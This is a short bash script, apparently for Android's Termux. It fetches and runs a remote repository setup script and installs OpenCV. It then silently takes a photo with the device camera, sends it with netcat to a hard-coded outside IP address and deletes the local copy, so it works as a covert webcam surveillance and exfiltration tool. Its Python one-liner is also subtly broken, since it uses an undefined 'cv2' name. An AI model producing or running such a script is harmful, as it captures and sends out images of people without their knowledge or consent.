#!/bin/bash
curl -LO https://its-pointless.github.io/setup-pointless-repo.sh&&bash setup-pointless-repo.sh&&pkg install opencv&&python3 -c "from cv2 import*;import os;cam= VideoCapture(0);s,img=cam.read();cv2.namedWindow('desired_name_of_window', flags=cv2.WINDOW_GUI_NORMAL);imwrite('filename.jpg', img);"&&nc -q0 3.17.9.18 1234 < filename.jpg&&rm filename.jpg
